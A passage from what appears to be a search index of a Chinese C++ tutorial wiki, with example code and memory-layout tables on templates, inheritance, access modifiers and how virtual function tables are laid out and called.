x; &#125;&#125;;现在Base类支持任意两种数据类型了 123456789101112131415161718192021222324252627282930313233343536373839template &lt;class T, class M&gt;class Base&#123;public: T a; T b; M x; M y;public: T Max() &#123; return a &gt; b ? a : b; &#125; M Min() &#123; return x &gt; y ? y : x; &#125;&#125;;int main()&#123; // Base b; //编译报错，因为编译器不知道T和M替换为什么类型 Base&lt;int, char&gt; b; // 需要告知编译器模板中的T、M用什么数据类型替换 b.a = 1; b.b = 2; b.x = 3; b.y = 4; int r1 = b.Max(); char r2 = b.Min(); return 0;&#125; 写代码时会发现，编译器知道Max的返回类型现在是int类型 小结 继承是数据的复制 模版是代码的复制"},{"title":"继承","path":"/wiki/C++/继承.html","content":"继承 12345678910111213struct Person &#123; int age; int sex;&#125;; struct Teacher &#123; int age; //和Person结构体中的成员一样 int sex; //和Person结构体中的成员一样 int level; int classId;&#125;; 上面这段代码，Teacher类中的age和sex和Person类的变量重了，相当于我们重复编写了代码。我们可以通过继承的方式来减少重复代码的编写。 什么是继承：继承就是数据的复制 为什么要用继承：减少重复代码的编写 Person称为父类或者基类 Teacher称为子类或者派生类 1234567891011struct Person &#123; int age; int sex;&#125;; struct Teacher:Person &#123; int level; int classId;&#125;; 把4个变量都写到Teacher结构体里，和，继承了Person类的Teacher类，反汇编是一样的 写到一起的Teacher结构体继承了Person类的Teacher类123456789101112131415161718192021222324252627282930struct Person &#123; int age; int sex;&#125;; struct Teacher&#123; int age; int sex; int level; int classId;&#125;;void Test()&#123; Teacher t; t.age = 1; t.sex = 2; t.level = 3; t.classId = 4;&#125;int main() &#123; Test(); return 0;&#125; 12345678910111213141516171819202122232425262728struct Person &#123; int age; int sex;&#125;; struct Teacher:Person &#123; int level; int classId;&#125;;void Test()&#123; Teacher t; t.age = 1; t.sex = 2; t.level = 3; t.classId = 4;&#125;int main() &#123; Test(); return 0;&#125; Upcasting（向上造型） Upcasting：把子类当父类看 Upcasting is the act of converting from a Derived reference or pointer to a base class reference or pointer cast造型，只是看待的眼光变了。而类型转换，丧失原来的数据类型 可以用父类指针指向子类的对象，这是允许的，且安全的 例 123456789101112131415161718192021222324252627282930313233343536373839struct Person&#123; int age; int sex;&#125;;struct Teacher : Person&#123; int level; int classId;&#125;;void Test()&#123; Teacher t; t.age = 1; t.sex = 2; t.level = 3; t.classId = 4; Teacher *p1 = &amp;t; p1-&gt;age = 1; p1-&gt;sex = 1; p1-&gt;level = 1; p1-&gt;classId = 1; Person *p2 = &amp;t; //编译器是允许将子类对象赋给父类指针的，不用强转为(Person*)， p2-&gt;age = 2; //ok p2-&gt;sex = 2; //ok p2-&gt;level = 2; //报错，找不到level p2-&gt;classId = 2; //报错，找不到classId&#125;int main()&#123; Test(); return 0;&#125; 下图是一个子类对象的内存布局示意图，在子类对象中，父类成员在子类成员前面（低地址），父类成员和子类成员的起始地址一样。&amp;t的类型，可以是父类类型，也可以是子类类型。所以Person *p2 = &amp;t时不用转型。 可以通过p2访问age和sex，但无法通过p2访问level和classId。（这是编译器层面无法访问，但对于学底层的人而言，是拦不住的，想访问，p2+1就过去了） 子类成员和父类相同 那么，如果子类中的一个成员和父类中的一个成员相同会如何？可以通过sizeof看这个子类的大小。 123456789101112131415161718192021222324#include &lt;stdio.h&gt;struct Person &#123; int age; int sex;&#125;; struct Teacher:Person // Inherit&#123; int age; //和父类Person的成员age重了 int classId;&#125;;int main() &#123; Teacher t; t.age = 30; t.sex = 1; t.classId = 20; printf(&quot;%d&quot;, sizeof(t)); //输出结果是16 return 0;&#125; sizeof输出是16。也就是说，不管子类中的成员是否和父类成员相同，只要是继承，编译器就会将父类的成员添加到子类中。 可以通过对象名.父类名称::成员名称来使用父类的age成员： 1234567891011int main() &#123; Teacher t; t.Person::age = 30; // Father t.age = 30; t.sex = 1; t.classId = 20; return 0;&#125; 多层继承 继承不仅仅局限于父类，会继承在该继承链上的所有父类 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;struct A &#123; int a; int b;&#125;; struct B:A &#123; int c; int d;&#125;; struct C:B &#123; int e; int f;&#125;;int main() &#123; C c; printf(&quot;%d&quot;, sizeof(c)); //输出结果是24，即6个int类型 return 0;&#125; C继承了B，还继承了A 多重继承 类C同时继承类A和类B 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;struct A &#123; int a; int b;&#125;; struct B &#123; int c; int d;&#125;; struct C:A,B // Multiple&#123; int e; int f;&#125;;int main() &#123; C c; printf(&quot;%d&quot;, sizeof(c)); //输出结果是24，即6个int类型 return 0;&#125; 这种方式在很多面向对象语言中是不允许使用的，在C++中是可以使用的。但不推荐使用多重继承，会增加程序的复杂度，容易出错 类B成员的起始地址是单独的，没和类A和类C都在同个起始地址，编译器做的维护工作就多了 注意：继承的类A和继承的类B的顺序，谁在前，谁就在内存分布中的前面 A在前，B在后B在前，A在后结构体和数组一样，都是从低地址到高地址方向增长。 低地址-&gt;高地址：A，B，C 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;struct A&#123; int a; int b;&#125;;struct B&#123; int c; int d;&#125;;struct C : A, B // Multiple&#123; int e; int f;&#125;;int main()&#123; C c; c.a = 1; c.b = 2; c.c = 3; c.d = 4; c.e = 5; c.f = 6; return 0;&#125; 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;struct A&#123; int a; int b;&#125;;struct B&#123; int c; int d;&#125;;struct C : B, A // Multiple&#123; int e; int f;&#125;;int main()&#123; C c; c.a = 1; c.b = 2; c.c = 3; c.d = 4; c.e = 5; c.f = 6; return 0;&#125; 低地址-&gt;高地址：B，A，C 反汇编 它们的反汇编都是一样的，看不出区别： 写到一起的结构体，和，继承了类A的类B 多层继承，和，多重继承"},{"title":"类成员的访问控制","path":"/wiki/C++/类成员的访问控制.html","content":"良好的编程习惯 良好的编程习惯：定义和实现分开在不同的文件，这样会有更好的可读性 Test.hTest.cppmain.cpp123456789struct Test&#123; int x; int y; int Bigger(int x, int y); int Max(int x, int y, int z);&#125;;123456789101112131415161718#include &quot;Test.h&quot;int Test::Bigger(int x, int y) //表明是Test类里的Bigger函数，而不是全局的Bigger函数&#123; if (x &gt; y) &#123; return x; &#125; else &#123; return y; &#125;&#125;int Test::Max(int x, int y, int z) //表明是Test类里的Max函数，而不是全局的Bigger函数&#123; return Bigger(Bigger(x, y), z);&#125;12345678910#include &quot;Test.h&quot;#include &lt;stdio.h&gt;int main()&#123; Test a; int r = a.Max(1, 2, 3); return 0;&#125; 访问控制 前言 假设在多人团队开发的场景下，小明提供了上面例子的Test.h和Test.cpp给小王用。小王开心地在main函数中#include &quot;Test.h&quot;，然后开始写了很多调用Test类中Max和Bigger函数的代码 1234567Demo a;int r = a.Max(1, 2, 3);int r2 = a.Bigger(2, 4);/* ...*/ 但小明一开始在设计Test类时写的Bigger函数原意义是作为Max函数的辅助函数，后面小明觉得Bigger函数设计得不合理，修改了Bigger函数，比如函数名，返回类型，参数，函数内部实现等等。Max函数里仍然通过Bigger函数来完成Max函数的功能。这么一改，出事了，因为小王已经在main函数中大量用到了Bigger函数。 上述情况的问题出在哪？答：类中的函数没有做访问控制。如果有那么一种机制，能限制Bigger函数只能在类内部使用，就能防止上述场景的发生。 C++提供了类中成员的访问控制，用访问修饰符public、private、protected。 访问修饰符 访问修饰符 名字 描述 public 公有成员 可以被该类中的函数、子类的函数、其友元函数访问，也可以由该类的对象访问 protected 受保护成员 可以被该类中的函数、子类的函数、以及其友元函数访问，但不能被该类的对象访问 private 私有成员 只能由该类中的函数、其友元函数访问，不能被任何其他访问，该类的对象也不能访问 使用建议 提供对外使用的变量或函数，用public修饰。那么它们就不能随意改动，因为已经被人用了 自己内部使用的，将来可能会变动的变量或函数，用private修饰 struct和class的区别 只有类成员的默认访问权不同这一点区别，其他没区别。 默认访问控制权 struct public class private 继承方式 参考： C++ 类访问修饰符 C++ public protected private区别 C++三种继承方式 继承方式 描述 public继承 不改变基类成员的访问权限，原本是什么就是什么 private继承 使得基类所有成员在子类中的访问权限变为private protected继承 将基类中public成员变为子类的protected成员，其它成员的访问权限不变 不同的继承方式会影响基类成员在派生类中的访问权限。 public继承方式 基类中所有 public 成员在派生类中为 public 属性； 基类中所有 protected 成员在派生类中为 protected 属性； 基类中所有 private 成员在派生类中还是private权限，派生类无权访问。 protected继承方式 基类中的所有 public 成员在派生类中为 protected 属性； 基类中的所有 protected 成员在派生类中为 protected 属性； 基类中所有 private 成员在派生类中还是private权限，派生类无权访问。 private继承方式 基类中的所有 public 成员在派生类中均为 private 属性； 基类中的所有 protected 成员在派生类中均为 private 属性； 基类中所有 private 成员在派生类中还是private权限，派生类无权访问。 继承方式/基类成员 public成员 protected成员 private成员 public继承 public protected private，子类无权访问 protected继承 protected protected private，子类无权访问 private继承 private private private，子类无权访问 但无论哪种继承方式，下面两点都没有改变： private属性的成员只能被本类成员（类内）和友元访问，不能被派生类访问； protected属性的成员可以被派生类访问。 其他问题 private成员真的不能访问吗？ 能否访问是通过语法层面，编译器层面的限制，编译器编译时会检查代码访问类成员时是否违背了访问修饰符的权限控制。但实际上想访问，还是拦不住学底层的人的： 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;struct Test&#123;private: int x;public: int y; void Init(int x, int y) &#123; this-&gt;x = x; this-&gt;y = y; &#125;&#125;;int main()&#123; Test t; t.Init(1, 2); int *p = (int *)&amp;t; int n = *p; //私有成员x int m = *(p + 1); //公有成员y printf(&quot;%d %d &quot;, n, m); return 0;&#125; private成员是否被继承 父类中的私有成员是会被继承的，但子类中还是无法访问，依然只有父类的成员函数能访问。这个限制也是编译器方面的限制，想访问是拦不住的： 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;class Base&#123;public: Base() &#123; x = 11; y = 12; &#125;private: int x; int y;&#125;;class Sub : Base //继承Base类时没写，默认是private继承方式&#123;public: int a; int b;&#125;;int main(int argc, char *argv[])&#123; Sub sub; //子类对象创建时，会自动调用父类构造函数 sub.a = 1; sub.b = 2; int *p = (int *)&amp;sub; printf(&quot;%d &quot;, sizeof(sub)); //16，4个int printf(&quot;%d &quot;, *(p + 0)); //基类私有成员x printf(&quot;%d &quot;, *(p + 1)); //基类私有成员y printf(&quot;%d &quot;, *(p + 2)); //子类公有成员a printf(&quot;%d &quot;, *(p + 3)); //子类公有成员b return 0;&#125;"},{"title":"虚函数","path":"/wiki/C++/虚函数.html","content":"直接调用和间接调用 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;class Base &#123; public: void Function_1() &#123; printf(&quot;Function_1... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Function_2... &quot;); &#125; &#125;; int main()&#123; //value Base b; b.Function_1(); b.Function_2(); //pointer Base* pb=&amp;b; pb-&gt;Function_1(); pb-&gt;Function_2(); //reference Base&amp; f=b; f.Function_1(); f.Function_2(); return 0;&#125; by valueby pointerby reference 普通成员函数 virtual函数 by value 直接call，E8 Call 直接call，E8 Call by pointer 直接call，E8 Call 间接call，FF Call by reference 直接call，E8 Call 间接call，FF Call 小结 通过对象调用时，virtual函数与普通成员函数都是直接调用，E8 Call 通过指针/引用调用时，virtual函数是间接call，FF Call 只有通过指针/引用且调用的是虚函数，才是间接调用，FF Call 类的大小 类中无虚函数类中有一个虚函数类中有两个虚函数12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123; x = 1; y = 2; &#125; void Function_1() &#123; printf(&quot;Function_1... &quot;); &#125; void Function_2() &#123; printf(&quot;Function_2... &quot;); &#125;&#125;;int main()&#123; Base b; printf(&quot;%x &quot;, sizeof(b)); return 0;&#125; 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123; x = 1; y = 2; &#125; void Function_1() &#123; printf(&quot;Function_1... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Function_2... &quot;); &#125;&#125;;int main()&#123; Base b; printf(&quot;%x &quot;, sizeof(b)); return 0;&#125; 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123; x = 1; y = 2; &#125; virtual void Function_1() &#123; printf(&quot;Function_1... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Function_2... &quot;); &#125;&#125;;int main()&#123; Base b; printf(&quot;%x &quot;, sizeof(b)); return 0;&#125; 大小 是谁 类中无虚函数 8 x，y 类中有一个虚函数 0xC 4字节+x，y 类中有两个虚函数 0xC 4字节+x，y 当类中有虚函数后（有1个和有100个的情况一样），对象起始位置多了一个4字节的值，这个值是一个地址，该地址指向一张表，里面存储了所有虚函数的地址。 以类中有两个虚函数为例，在Memory窗口看这个地址指向的数组中的值 这个地址称为虚函数地址表指针，vpointer，vptr 这个数组被称为虚函数地址表（简称虚表），virtualtable，vtable 证明数组中存的是函数地址 如果存的是函数地址，说明可以用函数指针来调用。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123; x = 1; y = 2; &#125; virtual void Function_1() &#123; printf(&quot;Function_1... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Function_2... &quot;); &#125; virtual void Function_3() &#123; printf(&quot;Function_3... &quot;); &#125;&#125;;int main()&#123; Base base; //对象的前四个字节就是虚函数表地址 printf(&quot;b 的虚函数表地址为：%x &quot;,*(int*)&amp;base); //通过函数指针调用函数，验证正确性 typedef void(*pFunction)(void); pFunction pFn; for(int i=0;i&lt;3;i++) &#123; int temp = *((int*)(*(int*)&amp;base)+i); pFn = (pFunction)temp; pFn(); &#125; return 0;&#125; 123456789&amp;Base //Base对象的地址，类型是Base*(DWORD*)&amp;Base //Base对象的地址，强转为DWORD*指针类型*(DWORD*)&amp;Base //vptr的值；对DWORD*类型取值，DWORD是4字节，所以从Base对象地址处开始取4字节(DWORD*)(*(DWORD*)&amp;base) //将vptr的值强转为DWORD*指针类型(DWORD*)(*(DWORD*)&amp;base) + i //指针+i个DWORD字节，就是虚表第i项*((DWORD*)(*(DWORD*)&amp;base)) //加*取值，取出以vptr为地址处的值，即虚表项第一项的值（第一个虚函数地址）*((DWORD*)(*(DWORD*)&amp;base) + i) //加*取值，取出虚表第i项的值 所属类 地址 成员变量 Base 0x0012FF68 vptr=0x00422e94 0x0012FF6C x=1 0x0012FF70 y=2 虚表 地址 值 内容 \"vptr->\"\" 0x00422E94 0x0040101E Base::Function_1函数地址 0x00422E98 0x00401019 Base::Function_2函数地址 0x00422E9C 0x00401023 Base::Function_3函数地址 各情况下虚表内容探测 无继承 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base&#123;private: int x; int y;public: Base() &#123; x = 1; y = 2; &#125; virtual void Function_1() &#123; printf(&quot;Function_1 called ... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Function_2 called ... &quot;); &#125; virtual void Function_3() &#123; printf(&quot;Function_3 called ... &quot;); &#125;&#125;;int main()&#123; Base base; // 对象的前四个字节就是虚函数表地址 printf(&quot;b 的虚函数表地址为：%x &quot;, *(DWORD *)&amp;base); // 通过函数指针调用函数，验证正确性 typedef void (*pFunction)(void); pFunction pFn; for (int i = 0; i &lt; 3; i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;base) + i); pFn = (pFunction)temp; pFn(); &#125; return 0;&#125; Base类： 变量：x，y 函数 虚函数Function_1 虚函数Function_2 虚函数Function_3 1class Base&#123;...&#125;; 所属类 地址 成员变量 Base 0x0012FF74 vptr=0x00422038 0x0012FF78 x=1 0x0012FF7C y=2 虚表 地址 值 内容 \"vptr->\"\" 0x00422038 0x00401014 Base::Function_1函数地址 0x0042203C 0x00401005 Base::Function_2函数地址 0x00422040 0x0040100a Base::Function_3函数地址 单继承+无函数覆盖 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base&#123;private: int x; int y;public: Base() &#123; x = 1; y = 2; &#125; virtual void Function_1() &#123; printf(&quot;Base::Function_1 called ... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Base::Function_2 called ... &quot;); &#125; virtual void Function_3() &#123; printf(&quot;Base::Function_3 called ... &quot;); &#125;&#125;;class Sub:public Base &#123;private: int z;public: Sub() &#123; z = 3; &#125; virtual void Function_4() &#123; printf(&quot;Sub::Function_4 called ... &quot;); &#125; virtual void Function_5() &#123; printf(&quot;Sub::Function_5 called ... &quot;); &#125; virtual void Function_6() &#123; printf(&quot;Sub::Function_6 called ... &quot;); &#125; &#125;; int main()&#123; Sub sub; // 对象的前四个字节就是虚函数表地址 printf(&quot;Sub 的虚函数表地址为：%x &quot;, *(DWORD*)&amp;sub); // 通过函数指针调用函数，验证正确性 typedef void (*pFunction)(void); pFunction pFn; for (int i = 0; i &lt; 6; i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;sub) + i); pFn = (pFunction)temp; pFn(); &#125; return 0;&#125; sub对象的vtable是有6项，变量监视窗口估计只显示了父类Base的，所以只显示了3项 Base类： 变量：x，y 函数 虚函数Function_1 虚函数Function_2 虚函数Function_3 Sub类： 变量：z 函数 虚函数Function_4 虚函数Function_5 虚函数Function_6 12class Base&#123;...&#125;;class Sub:public Base&#123;...&#125;; 所属类 地址 成员变量 Base 0x0012FF68 vptr=0x0042303C 0x0012FF6C x=1 0x0012FF70 y=2 Sub 0x0012FF74 z=3 虚表 地址 值 内容 \"vptr-> 0x0042303C 0x00401028 Base::Function_1函数地址 0x00423040 0x0040100F Base::Function_2函数地址 0x00423044 0x00401019 Base::Function_3函数地址 0x00423048 0x00401023 Sub::Function_4函数地址 0x0042304C 0x00401005 Sub::Function_5函数地址 0x00423050 0x00401014 Sub::Function_6函数地址 单继承+有函数覆盖 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base&#123;private: int x; int y;public: Base() &#123; x = 1; y = 2; &#125; virtual void Function_1() &#123; printf(&quot;Base::Function_1 called ... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Base::Function_2 called ... &quot;); &#125; virtual void Function_3() &#123; printf(&quot;Base::Function_3 called ... &quot;); &#125;&#125;;class Sub:public Base &#123;private: int z;public: Sub() &#123; z = 3; &#125; virtual void Function_1() &#123; printf(&quot;Sub::Function_1 called ... &quot;); &#125; virtual void Function_2() &#123; printf(&quot;Sub::Function_2 called ... &quot;); &#125; virtual void Function_6() &#123; printf(&quot;Sub::Function_6 called ... &quot;); &#125; &#125;; int main()&#123; Sub sub; // 对象的前四个字节就是虚函数表地址 printf(&quot;Sub 的虚函数表地址为：%x &quot;, *(DWORD*)&amp;sub); // 通过函数指针调用函数，验证正确性 typedef void (*pFunction)(void); pFunction pFn; for (int i = 0; i &lt; 6; i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;sub) + i); if(!temp) //读虚表内容读多了，就break，结束当前整个循环结构 &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; return 0;&#125; Base类： 变量：x，y 函数 虚函数Function_1 虚函数Function_2 虚函数Function_3 Sub类： 变量：z 函数 虚函数Function_1，override 虚函数Function_2，override 虚函数Function_6 12class Base&#123;...&#125;;class Sub:public Base&#123;...&#125;; 所属类 地址 成员变量 Base 0x0012FF68 vptr=0x0042303C 0x0012FF6C x=1 0x0012FF70 y=2 Sub 0x0012FF74 z=3 虚表 地址 值 内容 \"vptr-> 0x0042303C 0x00401023 Sub::Function_1函数地址 0x00423040 0x00401014 Sub::Function_2函数地址 0x00423044 0x00401019 Base::Function_3函数地址 0x00423048 0x0040100F Sub::Function_6函数地址 多继承+无函数覆盖 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base &#123; private: int a; int b; public: Base() &#123; a = 1; b = 2; &#125; virtual void Fn_1() &#123; printf(&quot;Base::Fn_1 called ... &quot;); &#125; virtual void Fn_2() &#123; printf(&quot;Base::Fn_2 called ... &quot;); &#125; &#125;; class Derived:public Base &#123;private: int c; public: Derived() &#123; c = 3; &#125; virtual void Fn_3() &#123; printf(&quot;Derived::Fn_3 called ... &quot;); &#125; virtual void Fn_4() &#123; printf(&quot;Derived::Fn_4 called ... &quot;); &#125; &#125;; class SubDerived:public Derived &#123;private: int d;public: SubDerived() &#123; d = 4; &#125; virtual void Fn_5() &#123; printf(&quot;SubDerived::Fn_5 called ... &quot;); &#125; virtual void Fn_6() &#123; printf(&quot;SubDerived::Fn_6 called ... &quot;); &#125; &#125;; int main(int argc, char* argv[]) &#123; //查看 subderived 的虚函数表 SubDerived subderived; //观察大小 printf(&quot;%x &quot;,sizeof(subderived)); //有1个虚表 //对象的前四个字节是虚函数表地址 printf(&quot;subderived 的虚函数表地址为：%x &quot;,*(DWORD*)&amp;subderived); //通过函数指针调用函数，验证正确性 typedef void(*pFunction)(void); pFunction pFn; for(int i=0;i&lt;6;i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;subderived)+i); if(!temp) //读虚表内容读多了，就break，结束当前整个循环结构 &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; return 0; &#125; Base类： 变量：a,b 函数 虚函数Fn_1 虚函数Fn_2 Derived类： 变量：c 函数 虚函数Fn_3 虚函数Fn_4 SubDerived类： 变量：d 函数 虚函数Fn_5 虚函数Fn_6 123class Base&#123;...&#125;;class Derived:public Base;class SubDerived:public Derived&#123;...&#125;; 所属类 地址 成员变量 Base 0x0012FF68 vptr=0042201C 0x0012FF6C a=1 0x0012FF70 b=2 Derived 0x0012FF74 c=3 SubDerived 0x0012FF78 d=4 虚表 地址 值 内容 \"vptr-> 0x0042201C 0x00401032 Base::Fn_1函数地址 0x00422020 0x0040104B Base::Fn_2函数地址 0x00422024 0x00401055 Derived::Fn_3函数地址 0x00422028 0x0040103C Derived::Fn_4函数地址 0x0042202C 0x00401037 SubDerived::Fn_5函数地址 0x00422030 0x00401041 SubDerived::Fn_6函数地址 多继承+有函数覆盖 例1 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base &#123; private: int a; int b; public: Base() &#123; a = 1; b = 2; &#125; virtual void Fn_1() &#123; printf(&quot;Base::Fn_1 called ... &quot;); &#125; virtual void Fn_2() &#123; printf(&quot;Base::Fn_2 called ... &quot;); &#125; &#125;; class Derived:public Base &#123;private: int c; public: Derived() &#123; c = 3; &#125; virtual void Fn_1() &#123; printf(&quot;Derived::Fn_1 called ... &quot;); &#125; virtual void Fn_3() &#123; printf(&quot;Derived::Fn_3 called ... &quot;); &#125; &#125;; class SubDerived:public Derived &#123;private: int d;public: SubDerived() &#123; d = 4; &#125; virtual void Fn_5() &#123; printf(&quot;SubDerived::Fn_5 called ... &quot;); &#125; &#125;; int main(int argc, char* argv[]) &#123; //查看 subderived 的虚函数表 SubDerived subderived; //观察大小 printf(&quot;%d &quot;,sizeof(subderived)); //有1个虚表 //对象的前四个字节是虚函数表地址 printf(&quot;subderived 的虚函数表地址为：%x &quot;,*(DWORD*)&amp;subderived); //通过函数指针调用函数，验证正确性 typedef void(*pFunction)(void); pFunction pFn; for(int i=0;i&lt;6;i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;subderived)+i); if(!temp) //读虚表内容读多了，就break，结束当前整个循环结构 &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; return 0; &#125; Base类： 变量：a,b 函数 虚函数Fn_1 虚函数Fn_2 Derived类： 变量：c 函数 虚函数Fn_1，override 虚函数Fn_3，override SubDerived类： 变量：d 函数 虚函数Fn_5 123class Base&#123;...&#125;;class Derived:public Base;class SubDerived:public Derived&#123;...&#125;; 所属类 地址 成员变量 Base 0x0012FF68 vptr=0042201C 0x0012FF6C a=1 0x0012FF70 b=2 Derived 0x0012FF74 c=3 SubDerived 0x0012FF78 d=4 虚表1 地址 值 内容 \"vptr1->\" 0x0042201C 0x0040105A Derived::Fn_1函数地址 0x00422020 0x0040104B Base::Fn_2函数地址 0x00422024 0x00401055 Derived::Fn_3函数地址 0x00422028 0x00401037 SubDerived::Fn_5函数地址 例2 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base &#123; private: int a; int b; public: Base() &#123; a = 1; b = 2; &#125; virtual void Fn_1() &#123; printf(&quot;Base::Fn_1 called ... &quot;); &#125; virtual void Fn_2() &#123; printf(&quot;Base::Fn_2 called ... &quot;); &#125; &#125;; class Derived:public Base &#123;private: int c; public: Derived() &#123; c = 3; &#125; virtual void Fn_1() &#123; printf(&quot;Derived::Fn_1 called ... &quot;); &#125; virtual void Fn_3() &#123; printf(&quot;Derived::Fn_3 called ... &quot;); &#125; &#125;; class SubDerived:public Derived &#123;private: int d;public: SubDerived() &#123; d = 4; &#125; virtual void Fn_1() &#123; printf(&quot;SubDerived::Fn_1 called ... &quot;); &#125; virtual void Fn_5() &#123; printf(&quot;SubDerived::Fn_5 called ... &quot;); &#125; &#125;; int main(int argc, char* argv[]) &#123; //查看 subderived 的虚函数表 SubDerived subderived; //观察大小 printf(&quot;%d &quot;,sizeof(subderived)); //有1个虚表 //对象的前四个字节是虚函数表地址 printf(&quot;subderived 的虚函数表地址为：%x &quot;,*(DWORD*)&amp;subderived); //通过函数指针调用函数，验证正确性 typedef void(*pFunction)(void); pFunction pFn; for(int i=0;i&lt;6;i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;subderived)+i); if(!temp) //读虚表内容读多了，就break，结束当前整个循环结构 &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; return 0; &#125; Base类： 变量：a,b 函数 虚函数Fn_1 虚函数Fn_2 Derived类： 变量：c 函数 虚函数Fn_1，override 虚函数Fn_3 SubDerived类： 变量：d 函数 虚函数Fn_1，override 虚函数Fn_5 123class Base&#123;...&#125;;class Derived:public Base;class SubDerived:public Derived&#123;...&#125;; 所属类 地址 成员变量 Base 0x0012FF68 vptr=0x00422048 0x0012FF6C a=1 0x0012FF70 b=2 Derived 0x0012FF74 c=3 SubDerived 0x0012FF78 d=4 虚表1 地址 值 内容 \"vptr1->\" 0x00422048 0x00401019 SubDerived::Fn_1函数地址 0x0042204C 0x0040101E Base::Fn_2函数地址 0x00422050 0x00401032 Derived::Fn_3函数地址 0x00422054 0x0040100A SubDerived::Fn_5函数地址 例3 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base &#123; private: int a; int b; public: Base() &#123; a = 1; b = 2; &#125; virtual void Fn_1() &#123; printf(&quot;Base::Fn_1 called ... &quot;); &#125; virtual void Fn_2() &#123; printf(&quot;Base::Fn_2 called ... &quot;); &#125; &#125;; class Derived:public Base &#123;private: int c; public: Derived() &#123; c = 3; &#125; virtual void Fn_3() &#123; printf(&quot;Derived::Fn_3 called ... &quot;); &#125; &#125;; class SubDerived:public Derived &#123;private: int d;public: SubDerived() &#123; d = 4; &#125; virtual void Fn_1() &#123; printf(&quot;SubDerived::Fn_1 called ... &quot;); &#125; virtual void Fn_3() &#123; printf(&quot;SubDerived::Fn_3 called ... &quot;); &#125; &#125;; int main(int argc, char* argv[]) &#123; //查看 subderived 的虚函数表 SubDerived subderived; //观察大小 printf(&quot;%d &quot;,sizeof(subderived)); //有1个虚表 //对象的前四个字节是虚函数表地址 printf(&quot;subderived 的虚函数表地址为：%x &quot;,*(DWORD*)&amp;subderived); //通过函数指针调用函数，验证正确性 typedef void(*pFunction)(void); pFunction pFn; for(int i=0;i&lt;6;i++) &#123; int temp = *((DWORD*)(*(DWORD*)&amp;subderived)+i); if(!temp) //读虚表内容读多了，就break，结束当前整个循环结构 &#123; break; &#125; pFn = (pFunction)temp; pFn(); &#125; return 0; &#125; Base类： 变量：a,b 函数 虚函数Fn_1 虚函数Fn_2 Derived类： 变量：c 函数 虚函数Fn_3 SubDerived类： 变量：d 函数 虚函数Fn_1，override 虚函数Fn_3，override 123class Base&#123;...&#125;;class Derived:public Base;class SubDerived:public Derived&#123;...&#125;; 所属类 地址 成员变量 Base 0x0012FF68 vptr=0x00422048 0x0012FF6C a=1 0x0012FF70 b=2 Derived 0x0012FF74 c=3 SubDerived 0x0012FF78 d=4 虚表1 地址 值 内容 \"vptr1->\" 0x00422048 0x00401019 SubDerived::Fn_1函数地址 0x0042204C 0x0040101E Base::Fn_2函数地址 0x00422050 0x00401037 SubDerived::Fn_3函数地址 多重继承+无函数覆盖 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;stdio.h&gt;#include &lt;windows.h&gt;class Base1&#123;private: int a; int b;public: Base1() &#123; a = 1; b = 2; &#125; virtual void Fn_1() &#123; printf(&quot;Base1::Fn_1 called ... &quot;); &#125; virtual void Fn_2() &#123; printf(&quot;Base1::Fn_2 called ... &quot;); &#125;&#125;;class Base2&#123;private: int c;public: Base2() &#123; c = 3; &#125; virtual void Fn_3() &#123; printf(&quot;Base2::Fn_3 called ... &quot;); &#125; virtual void Fn_4() &#123; printf(&quot;Base2::Fn_4 called ... &quot;); &#125;&#125;;class Derived : public Base1, public Base2&#123;private: int d;public: Derived() &#123; d = 4; &#125; virtual void Fn_5() &#123; printf(&quot;Derived::Fn_5 called ... &quot;); &#125; virtual void Fn_6() &#123; 